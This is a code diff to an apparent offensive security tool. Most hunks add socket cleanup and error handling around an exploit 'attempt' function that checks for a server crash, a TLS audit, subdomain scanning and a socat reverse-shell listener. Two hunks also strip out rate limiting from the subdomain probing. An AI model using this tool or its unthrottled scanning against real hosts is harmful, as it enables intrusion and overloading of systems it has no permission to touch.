@@ -1037,7 +1037,11 @@ def _connect(host: str, port: int, timeout: float = 5.0,
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode    = ssl.CERT_NONE
-        s = ctx.wrap_socket(s, server_hostname=host)
+        try:
+            s = ctx.wrap_socket(s, server_hostname=host)
+        except Exception:
+            s.close()
+            raise
     return s
 
 
@@ -1604,13 +1608,17 @@ def tls_audit(host: str, port: int, proxy: str = None) -> dict:
 
     # Certificate checks
     try:
-        raw  = socket.create_connection((host, port), timeout=5)
-        ctx  = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode    = ssl.CERT_NONE
-        ts   = ctx.wrap_socket(raw, server_hostname=host)
-        cert = ts.getpeercert()
-        ts.close()
+        raw = socket.create_connection((host, port), timeout=5)
+        try:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode    = ssl.CERT_NONE
+            ts   = ctx.wrap_socket(raw, server_hostname=host)
+            cert = ts.getpeercert()
+            ts.close()
+        except Exception:
+            raw.close()
+            raise
 
         if cert:
             subj   = dict(x[0] for x in cert.get("subject", []))
@@ -2115,10 +2123,12 @@ def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy,
     except socket.timeout:
         try:
             ck = _connect(host, port, timeout=0.2, tls=tls, proxy=proxy)
-            ck.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() +
-                       b"\r\nConnection: close\r\n\r\n")
-            crashed = not ck.recv(10)
-            ck.close()
+            try:
+                ck.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() +
+                           b"\r\nConnection: close\r\n\r\n")
+                crashed = not ck.recv(10)
+            finally:
+                ck.close()
         except Exception as e:
             vlog(f"[v] Check conn: {e}")
             crashed = True
@@ -2150,12 +2160,15 @@ def _run_subfinder(domain: str, timeout: float = 60.0) -> list:
         for line in result.stdout.splitlines():
             line = line.strip()
             if line and line.endswith(f".{domain}"):
-                # strip the base domain to get just the subdomain prefix
                 prefix = line[: -(len(domain) + 1)]
                 if prefix:
                     subs.append(prefix)
         return subs
-    except Exception:
+    except subprocess.TimeoutExpired:
+        vlog("[v] subfinder timed out")
+        return []
+    except Exception as e:
+        vlog(f"[v] subfinder error: {e}")
         return []
 
 
@@ -2165,7 +2178,6 @@ def _probe_subdomain(fqdn, port, tls, proxy, timeout):
     except socket.gaierror:
         return None
     try:
-        if _rate_limiter: _rate_limiter.acquire()
         headers = _http_head(fqdn, port, tls=tls, proxy=proxy, timeout=timeout)
         server  = headers.get("server", "")
         version = _parse_version(server) if server else None
@@ -2202,7 +2214,6 @@ def subdomain_scan(domain, wordlist, port=80, tls=False,
     with ThreadPoolExecutor(max_workers=n_threads) as ex:
         futures = {}
         for sub in all_subs:
-            if _rate_limiter: _rate_limiter.acquire()
             futures[ex.submit(_probe_subdomain, f"{sub}.{domain}", port, tls, proxy, timeout)] = sub
         for fut in as_completed(futures):
             r = fut.result()
@@ -2315,7 +2326,6 @@ def start_shell_listener(port: int, upgrade: bool = False) -> threading.Thread:
 
     def _run():
         # try socat first (best interactive shell experience)
-        import shutil, subprocess
         if shutil.which("socat"):
             log(f"[*] socat listener — 0.0.0.0:{port}")
             log(_PTY_UPGRADE)
